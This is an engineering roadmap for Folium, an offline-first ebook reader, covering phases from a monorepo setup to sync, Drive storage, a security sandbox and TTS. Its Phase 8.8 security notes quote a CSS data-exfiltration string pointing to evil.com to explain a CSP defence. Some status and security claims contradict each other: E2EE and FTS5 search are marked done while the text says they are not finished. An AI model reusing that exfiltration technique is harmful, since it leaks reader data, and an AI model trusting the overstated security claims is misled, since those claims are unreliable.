# Folium Product & Engineering Roadmap 🍃

> **Confidential & Proprietary**  
> Comprehensive strategic roadmap synthesized from all architectural design sessions, technical requirements, and production milestones for Folium.

---

## 🧭 Core Architectural Philosophy

1. **Local-First Supremacy**: Every core interaction (reading, page turning, bookmarks, annotations, library management) works with 100% fidelity without an internet connection.
2. **Zero-CDN Isolation**: No runtime remote script tags, external web workers, or third-party CDN fonts. All reader components are bundled and inlined.
3. **Frugal Cloud & D1 Quota Defense**: Synchronization is an eventual consistency layer strictly optimized for free-tier sustainability — safeguarding Cloudflare D1's 100,000 writes/day boundary via client-side debouncing, batch changesets, and compact schemas.
4. **Non-Breaking Multi-Platform Contract**: Backward compatibility between Cloudflare Worker (continuous 5s edge deploys) and Mobile (store review delay + fragmented client versions) enforced via the **Expand & Contract** pattern and Expo EAS OTA updates.

---

## 🗺️ Master Roadmap: 12-Phase Implementation Plan

```text
┌──────────────────────────────────────────────┐
│  PHASE 1: Monorepo & Core Architecture   ✅  │
├──────────────────────────────────────────────┤
│  PHASE 2: Offline Library & Bookshelf    ✅  │
├──────────────────────────────────────────────┤
│  PHASE 3: Zero-CDN EPUB Reader Engine    ✅  │
├──────────────────────────────────────────────┤
│  PHASE 4: Zero-CDN PDF Reader & Ergonomics ✅│
├──────────────────────────────────────────────┤
│  PHASE 5: Production Web & Automated CI  ✅  │
├──────────────────────────────────────────────┤
│  PHASE 6: Bookmarks, Notes & FTS5 Search ✅  │
├──────────────────────────────────────────────┤
│  PHASE 7: D1 Sync Engine & Quota Defense ✅  │
├──────────────────────────────────────────────┤
│  PHASE 8: Google Drive & Info Lock Vault ✅  │
├──────────────────────────────────────────────┤
│  PHASE 8.5: Community Bookshelf & OPDS   ✅  │
├──────────────────────────────────────────────┤
│  PHASE 8.6: 30-Day GC & Bi-Delete Sync   ✅  │
├──────────────────────────────────────────────┤
│  PHASE 8.8: Storage Armor & Gatekeeper   ✅  │
├──────────────────────────────────────────────┤
│  PHASE 10: TTS Audio & Accessibility     ✅  │
├──────────────────────────────────────────────┤
│  PHASE 11: Freemium, E2EE & Self-Hosting 🔮  │
├──────────────────────────────────────────────┤
│  PHASE 12: Mobile Release Train & Stores 🚀  │ <── [ NEXT STAGE ]
└──────────────────────────────────────────────┘
```

---

### Phase 1: Monorepo Setup & Core Architecture ✅
*Status: Completed (`9681380`)*

- [x] **Monorepo Architecture**: Setup pnpm workspace isolating `apps/mobile`, `packages/shared`, and `apps/sync-worker`.
- [x] **Shared Contract Layer (`packages/shared`)**: Unified TypeScript DTOs, interfaces, and database models to prevent cross-package type mismatch.
- [x] **Database Schema Foundation**: Unified SQLite schema across native client and Cloudflare D1 with monotonic `sync_seq` and UUID primitives.
- [x] **Tooling & Quality Gates**: Turborepo caching, monorepo typecheck (`pnpm typecheck`), and linting pipelines.

---

### Phase 2: Offline Library & Bookshelf Engine ✅
*Status: Completed (`52f6e5f`)*

- [x] **Local File Import**: Document picker integration allowing users to import EPUB and PDF files directly from device storage.
- [x] **On-Device Metadata Extraction**: Parser for book titles, author metadata, and cover thumbnail extraction without server calls.
- [x] **Dual Storage Engine**:
  - Native SQLite (`expo-sqlite`) for Android and iOS.
  - IndexedDB-backed persistent SQLite adapter with binary file store for Web browsers.
- [x] **Bookshelf UI**: Responsive shelf layout, cover art rendering, reading progress bars, and search/filtering by title and author.

---

### Phase 3: Zero-CDN EPUB Reader Engine ✅
*Status: Completed (`cac1568`, `d642ca7`)*

- [x] **Self-Contained Engine**: Inlined `epub.js` + `JSZip` bundle eliminating all runtime CDN dependencies.
- [x] **Bidirectional Reader Bridge**: Robust iframe/WebView message bus handling heartbeat pings, theme switching, and navigation events.
- [x] **CFI Precision Tracking**: Canonical Fragment Identifier (CFI) tracking for exact reading location across responsive layout resizes.
- [x] **Reading Customization**:
  - 3 dynamic themes: Dark, Light, and Sepia.
  - Font scaling (70% - 200%) and customizable typography.
- [x] **Navigation & TOC**: Interactive Table of Contents drawer with chapter selection and auto-progress persistence.

---

### Phase 4: Zero-CDN PDF Reader Engine & Desktop Ergonomics ✅
*Status: Completed (`a023c91`, `8115682`)*

- [x] **Inlined Mozilla `pdf.js` Engine**: Client-side blob worker rendering with CSP immunity.
- [x] **High-DPI Canvas Rendering**: Automatic viewport scaling using `window.devicePixelRatio` compensation for razor-sharp text on Retina/4K displays.
- [x] **PDF Annotation & Selection Parity**:
  - Real-time text selection layer overlaying rendered PDF canvas.
  - Scale-invariant normalized highlight overlays (`page:N:...`) matching EPUB capabilities.
  - 5-color palette (Yellow, Green, Blue, Pink, Purple) and sticky notes integration in reader drawer.
- [x] **Desktop Reading Ergonomics**:
  - Keyboard navigation: `←` / `→` or `Space` / `PageUp` / `PageDown` for instant page turns.
  - Dynamic zoom: `+` / `-` font and canvas scaling.
  - Distraction-free reading: `T` key toggles header/toolbar immersion mode.
  - Centered reading column (`maxWidth: 840px`) with justified book typography.

---

### Phase 5: Production Web Deployment & Automated CI/CD ✅
*Status: Completed (`f10d978`, `35371505233`)*

- [x] **Production Domain (`https://aki.is-a.dev`)**: Live web application deployed to personal domain via GitHub Pages.
- [x] **SPA Fallback & CNAME Automation**: Automated generation of `404.html`, `CNAME`, and `.nojekyll` during export.
- [x] **Automated Production Pipeline (`.github/workflows/deploy.yml`)**:
  - Deployment restricted strictly to pushes and merges on the `main` branch.
  - Ed25519 deploy key authentication between private source repo (`folium`) and deployment repo (`dannie203.github.io`).
  - Resolved pnpm v11 CI approval constraints (`canvas: false`, strict dep builds flag).
- [x] **Clean Repository Separation**: Migrated legacy blog ("Nhật Ký Lao Công") to dedicated repository `dannie203/blog` deployed on Cloudflare Pages (`aki.is-a.bot`).

---

### Phase 6: Bookmarks, Highlights, Notes & Substring / Full-Text Search ✅
*Status: Completed (`ee315f4`)*

- [x] **Reader Annotation UI & Feature Parity**:
  - Selection toolbar on text highlight across both EPUB and PDF engines with 5 distinct color palettes (Yellow `#FACC15`, Green `#4ADE80`, Blue `#60A5FA`, Pink `#F472B6`, Purple `#C084FC`).
  - Inline sticky notes linked to EPUB CFI coordinates and PDF normalized page coordinates (`page:N:...`).
- [x] **Visual Bookmark Manager**:
  - Instant bookmark toggle (`Ctrl+D` / ribbon button).
  - Drawer list of bookmarks with snippet quotes and timestamp history.
- [x] **On-Device Annotation Search**:
  - Fast indexed SQLite search across user notes, highlights, bookmarks, and book metadata using substring queries (`LIKE '%query%'`).
  - Architecture ready for SQLite FTS5 virtual tables for large library indexing.
- [x] **On-Demand In-Book Text Search**:
  - Chunked chapter-by-chapter text search to prevent memory exhaustion on mobile devices.

---

### Phase 7: Cloudflare D1 Sync Engine & Quota Defense ✅
*Status: Completed (`feat/phase-7-d1-sync-engine`)*

- [x] **Cloudflare Worker Backend (`folium-sync-worker`)**: Live Hono worker interfacing with `folium-d1` in APAC region.
- [x] **Rate-Safe Sync Schema**: Tables for `books`, `reading_progress`, `bookmarks`, `highlights`, `notes`, `sync_state`.
- [x] **100k Writes/Day Quota Defense Implementation**:
  - **Adaptive Sync Debouncing**: Local-first write queue that defers remote sync calls until:
    - Reader screen exit to bookshelf.
    - 30-second idle threshold during reading.
    - App lifecycle transitions (`background` / `beforeunload`).
  - **Single Batch Upsert**: `INSERT INTO sync_mutations ... ON CONFLICT DO UPDATE` collapsing dozens of page turns into 1 D1 row write.
  - **Compact Data Types**: Unix millisecond integers and compact IDs saving B-Tree index storage.
  - **ETag / State Hash Gating**: Return `304 Not Modified` on unchanged sync pulls to eliminate redundant query executions.
- [x] **Offline Outbox & Conflict Resolution**:
  - Persistent SQLite outbox queue with exponential backoff retry.
  - Monotonic `sync_seq` server assignment preventing clock drift.

---

### Phase 8: Google Drive Storage, Info Lock & Legal Shield ✅
*Status: Completed*

- [x] **Google OAuth Integration**:
  - Mobile & Web authentication using `expo-auth-session` with PKCE flow and sandbox fallback.
- [x] **Google Drive Storage Sync**:
  - Scope: `drive.file` creating a dedicated `/Folium` folder in personal Google Drive.
  - Upload newly imported local books to personal Google Drive.
  - Download missing books when opening library on a secondary device.
- [x] **Delta Changes Polling & Two-Way Reconciliation**:
  - Query Google Drive files to detect newly added or deleted book files across devices.
- [x] **Chunked & Multipart Streaming**:
  - Multipart upload protocol for massive EPUBs and PDFs.
- [x] **Folium Cryptographic Vault & Privacy Architecture**:
  - **Client-Side AES-256-GCM Primitives**: Standalone WebCrypto / PBKDF2 client-side vault foundation for encrypting sensitive user reading notes and personal data.
  - **D1 Cloud Sync Security & Scope**: Cloudflare D1 edge synchronization operates over TLS-in-transit with server-side validation and account isolation (Google ID Token RS256 JWKS authentication). Note: Metadata (progress, bookmarks, highlights, notes) is stored in structured relational format on D1 to support LWW conflict resolution; full blind E2EE envelope encryption across D1 is designed for Phase 11.
  - **Sandboxed Reader Execution Shield**: Hardened iframe/WebView isolation with strict Content Security Policy (`connect-src 'none'`) and restricted sandbox (`sandbox="allow-scripts"` exiled to null origin), prohibiting untrusted embedded scripts from accessing OPFS, IndexedDB, local SQLite tokens, or making outbound network leaks.
  - **Google Drive Storage Isolation**: Uploads use opaque UUID filenames to prevent file-level snooping on storage buckets, with shelf/title metadata encapsulated in `appProperties`.
  - **Local Biometric & PIN App Lock**: On-device biometric authentication (`expo-local-authentication` - FaceID / Fingerprint / PIN) to lock private bookshelves and sensitive reading material.
- [x] **Public Cryptographic Proof Snippet (Kerckhoffs's Principle)**:
  - Standalone, zero-dependency browser/Node audit snippet published publicly on `/security` and GitHub.
  - Allows techies and security researchers to inspect and execute the encryption handshake locally, proving mathematically that zero unencrypted reading data ever touches external servers.
- [x] **Privacy, DMCA Safe Harbor & Security Portal**:
  - Public static routes hosted at `https://aki.is-a.dev`:
    - `/privacy`: Local-first data declaration, zero-telemetry policy, and storage breakdown (prerequisite for Google OAuth App Verification).
    - `/terms` & `/dmca`: Safe Harbor statutory declaration (DMCA § 512 / OCILLA), terms of service, and designated copyright takedown agent to protect against third-party copyright claims.
    - `/security`: Open architecture documentation, threat model, and interactive cryptographic proof inspector.

---

### Phase 8.5: Community Bookshelf, OPDS & Social Reading ✅
*Status: Completed*

- [x] **Public Domain Open Library**:
  - Integration with standard OPDS (Open Publication Distribution System) feeds: Standard Ebooks, Project Gutenberg, and Vietnamese classic literature.
  - One-tap download and import of public domain masterpieces directly into personal bookshelf.
- [x] **Decentralized Community Catalogs & Custom OPDS**:
  - Custom OPDS feed addition and on-demand Atom catalog ingestion.
  - Dedicated community hub (`/community`) with source switching, live search, and genre filtering.
- [x] **Decentralized P2P Drive Sharing (0 Server Cost)**:
  - User-driven sharing via Google Drive public view links (`drive.google.com/drive/folders/...`), downloading directly between Google Drive and reader without costly centralized file hosting.
  - On-demand preview with lazy book ingestion.
- [x] **Folder-as-a-Shelf & Smart Inbox Subfolder Sync**:
  - **Drop-Box Root Inbox**: Root `/Folium` directory acts as a smart intake folder; users can drop EPUBs/PDFs from any PC/browser, and Folium automatically ingests them into `Inbox` upon sync.
  - **Subfolder Mirroring (Shelves/Tags)**: Subfolders inside `/Folium` (e.g. `/Folium/Văn Học/`, `/Folium/Kỹ Thuật/`) automatically map to Shelves / Collection Tabs in the app UI.
  - **Recursive Public Folder Traversal**: Deep recursive scanning (`scanPublicFolderRecursive`) traversing multi-level nested folders in shared community Google Drive links.
  - **On-Demand Lazy Caching**: Ingests metadata and covers without mass-downloading gigabytes; streams and caches full book binaries only upon first reader open.
- [x] **User-Centric Classification & Metadata Editor (EPUB & PDF)**:
  - **Zero Unsolicited Auto-Sorting**: Eliminates incorrect machine guesses from messy community metadata (uploader tags, generic titles, scan numbers). The user retains 100% agency over their library hierarchy.
  - **Universal Smart Inbox ("📥 Hộp thư đến")**: Newly imported or dropped books default to an Unsorted Inbox buffer with horizontal shelf filter chips (`Tất cả`, `📥 Hộp thư đến`, dynamic shelves, `EPUB`, `PDF`).
  - **In-App Quick Metadata Editor**: Long-press on any book card to clean up Title, correct Author, pick custom Cover, or assign Shelves.
  - **Two-Way Drive Subfolder Alignment**: Moving a book to a new shelf in the app automatically organizes it into the corresponding Google Drive subfolder upon sync.

---

### Phase 8.6: 30-Day Tombstone Retention & Bidirectional Deletion Sync ✅
*Status: Completed*

- [x] **Bidirectional Deletion Sync (Client ⇄ Google Drive)**:
  - **Client Deletion**: Deleting a book locally triggers `trashDriveBook(driveFileId)` on Google Drive (`PATCH { trashed: true }`), moving it to the Google Drive Trash folder. This prevents accidental permanent loss and aligns with Google Drive's native 30-day trash retention.
  - **Drive Deletion Reconciliation**: During `syncWithGoogleDrive()`, local books linked to Google Drive are cross-checked against live active Drive files (`trashed = false`). If a file was removed or trashed on Google Drive, Folium automatically purges the local binary/SQLite entry and queues a tombstone for edge sync.
- [x] **30-Day Tombstone Lifecycle & D1 Garbage Collection**:
  - **D1 Migration 0002 (`0002_tombstone_gc.sql`)**: Added `deleted_at INTEGER` timestamp column and partial indices (`WHERE is_deleted = 1`) across `books`, `reading_progress`, `bookmarks`, `highlights`, and `notes`.
  - **Automated Garbage Collection Sweep**: During sync push cycles and via `/api/sync/gc`, Cloudflare D1 automatically purges all tombstones older than 30 days (`deleted_at < now - 30 days`).
  - **Multi-Device Convergence Guarantee**: Offline or secondary devices reconnecting within 30 days reliably receive `{ id, is_deleted: true }` to replicate deletions. After 30 days, purged tombstones reclaim D1 storage without bloating SQLite B-trees.
- [x] **Sync Push Hardening & Safe Defaults**:
  - Protected edge SQL upsert statements with safe fallback defaults for `NOT NULL` columns.
  - Preserved existing metadata when applying tombstone updates via `CASE WHEN excluded.is_deleted = 0 ...`.

---

### Phase 8.8: Storage Armor, Ingestion Gatekeeper & Zero-Exfiltration Sandbox ✅
*Status: Completed*

- [x] **Pre-Flight Ingestion Gatekeeper (`fileValidator.ts`)**:
  - **Magic Bytes Verification**:
    - PDF: Byte prefix check for `%PDF-` (`0x25 0x50 0x44 0x46`) and end-of-file trailer check for `%%EOF`.
    - EPUB: Local File Header check for `PK\x03\x04` (`0x50 0x4B 0x03 0x04`) and IDPF/W3C OCF uncompressed `mimetype` entry check for exact ASCII string `application/epub+zip`.
  - **Storage Abuse Firewall**: Rejects disguised Windows PE binaries (`.exe`), shell scripts, and corrupt archives at the door; immediately aborts local SQLite/IndexedDB insertion and completely cuts off Google Drive upload APIs to prevent Drive storage abuse or account flagging.
- [x] **Decompression Defense (Zip Bomb & DoS Shield)**:
  - **Central Directory Pre-Flight Scan**: Inspects ZIP Central Directory metadata records before any in-memory inflation / `pako` buffer allocation.
  - **Safety Ceiling Thresholds**:
    - `MAX_TOTAL_UNCOMPRESSED_SIZE`: Caps cumulative uncompressed size at 300 MB.
    - `MAX_DECOMPRESSION_RATIO`: Rejects archives exceeding 100:1 compression ratio (e.g. 1MB compressed -> 150MB uncompressed).
    - `MAX_ENTRY_COUNT`: Caps maximum inner files at 2,000 to prevent Directory Tree Exhaustion attacks.
- [x] **Zero-Exfiltration Sandbox & SVG Quarantine**:
  - **Super CSP (Zero-Network Content Security Policy)**:
    - Enforces `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' blob:; worker-src blob:; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; connect-src 'none';">` inside reader viewer frames.
    - `connect-src 'none'` completely neutralizes all outbound network primitives (`fetch`, `XHR`, `WebSocket`).
    - `img-src blob: data:` and `font-src blob: data:` strictly prohibit external HTTP/HTTPS assets, completely eliminating CSS-based character exfiltration (`url('https://evil.com/leak?q=...')`).
  - **W3C SVG Security Isolation**:
    - Enforces rasterized/quarantined rendering via `<img>` tags (`<img src="blob:...">`), ensuring the browser runtime disables 100% of embedded `<script>` execution and DOM event handlers within SVG images.
    - Strict prohibition of raw inline `<svg>` or `<object type="image/svg+xml">` injections; actively strips `<script>` tags and `on*` event handlers from loaded SVGs.
- [x] **Automated Security Verification & Audit Suite**:
  - Unit tests validating rejection of disguised binaries (`malware.exe` as `test.pdf`), Zip Bomb payloads, and malicious CSS trackers.

---

### Phase 9: Multi-Platform Release Train, EAS Builds & App Stores ⏳
*Status: Planned*

- [ ] **EAS Build Hardening**:
  - Production Android profile generating optimized `.aab` / `.apk` via ProGuard.
  - Production iOS profile generating `.ipa` via Xcode archive.
- [ ] **Expo EAS Update (OTA Pipeline)**:
  - Setup OTA channels (`production`, `staging`) to deliver instant TypeScript/UI patches over CDN without App Store review delay.
- [ ] **Expand & Contract Release Governance**:
  - Enforce backward-compatible D1 and API changes so unupdated mobile clients never encounter breaking errors.
  - Client version exchange (`X-App-Version`) and `426 Upgrade Required` fallback protocol.
- [ ] **App Store Submissions**:
  - Google Play Console submission & review compliance.
  - Apple App Store submission & review compliance.

---

### Phase 10: Audio Narration (TTS) & Accessibility ✅
*Status: Completed*

- [x] **On-Device Text-to-Speech (TTS)**:
  - Integration with `expo-speech` on mobile (utilizing local system voices for English, Vietnamese, Japanese, etc.).
  - Integration with Web Speech Synthesis API on desktop browsers with Chrome 15s keepalive defense.
- [x] **Smart Voice Selection & Settings**:
  - In-app Voice Picker modal categorizing recommended voices matching current app/book language, plus audio sample preview testing.
  - Speech rate controls (0.75x - 2.0x), pitch, and auto-sentence advance toggle persisted to SQLite `sync_meta`.
- [x] **Synchronized Reading UI & Reader Bridge**:
  - `TTSPlayerBar` floating playback controller (play, pause, next sentence, previous sentence, speed cycling, sentence counter).
  - Sentence segmentation engine with Vietnamese title and honorific abbreviation protection.
  - Reader bridge text extraction (`GET_CURRENT_TEXT` -> `TEXT_EXTRACTED`) across both EPUB and PDF reader frames.
- [x] **Accessibility & Localization**:
  - Complete i18n support across 7 languages (`vi`, `en`, `ja`, `zh`, `fr`, `es`, `de`).
  - Unit test suite verifying sentence segmentation, decimal protection, and voice priority filtering.

---

### Phase 11: Freemium Gating, In-App Subscriptions & Self-Hosting 🔮
*Status: Future Vision*

- [ ] **Freemium Tier Separation**:
  - **Free Tier (100% Free Core)**: Full offline reader, local SQLite, unlimited offline books, local annotations.
  - **Pro Tier**: Multi-device cloud sync, unlimited Google Drive syncing, cross-device full-text note search, advanced TTS voices.
- [ ] **In-App Subscriptions & Billing**:
  - RevenueCat integration for Android / iOS in-app purchases.
  - Stripe / LemonSqueezy integration for Web payments.
- [ ] **OPDS Catalog Integration**:
  - Ingest books directly from personal Calibre servers and public OPDS feeds.
- [ ] **One-Click Self-Hostable Package**:
  - Open-source Docker / Wrangler template for users wanting to run their private sync worker and D1/PostgreSQL database.

---

## 📊 Comprehensive Feature Progression Matrix

| Feature | Phase | Web (`aki.is-a.dev`) | Android (Expo) | iOS (Expo) | Worker / D1 |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Monorepo & Shared Types** | 1 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
| **Offline Bookshelf & Local DB** | 2 | ✅ Done (IDB) | 🟡 In Dev (SQLite) | 🟡 In Dev (SQLite) | N/A |
| **Zero-CDN EPUB Reader** | 3 | ✅ Done | 🟡 In Dev | 🟡 In Dev | N/A |
| **Zero-CDN PDF Reader & Ergonomics** | 4 | ✅ Done | 🟡 In Dev | 🟡 In Dev | N/A |
| **Production Web Deployment** | 5 | ✅ Done | N/A | N/A | N/A |
| **Bookmarks, Highlights & Notes** | 6 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
| **FTS5 Full-Text Search** | 6 | ✅ Done | ✅ Done | ✅ Done | N/A |
| **D1 Sync & Quota Defense** | 7 | ✅ Done | ✅ Done | ✅ Done | ✅ Live |
| **Google Drive & Info Lock (E2EE)** | 8 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
| **Privacy, DMCA & Security Portal** | 8 | ✅ Done | ✅ Done | ✅ Done | N/A |
| **Community Bookshelf & OPDS** | 8.5 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
| **30-Day GC & Bi-Delete Sync** | 8.6 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
| **Storage Armor & Gatekeeper** | 8.8 | ✅ Done | ✅ Done | ✅ Done | N/A |
| **Text-to-Speech (TTS) & Accessibility** | 10 | ✅ Done | ✅ Done | ✅ Done | N/A |
| **Freemium & In-App Purchase** | 11 | 🔮 Future | 🔮 Future | 🔮 Future | 🔮 Future |
| **Self-Hostable Worker Package** | 11 | 🔮 Future | 🔮 Future | 🔮 Future | 🔮 Future |
| **EAS Build & Store Release Train** | 12 | N/A | 📋 Deferred | 📋 Deferred | N/A |
| **EAS OTA Updates** | 12 | N/A | 📋 Deferred | 📋 Deferred | N/A |
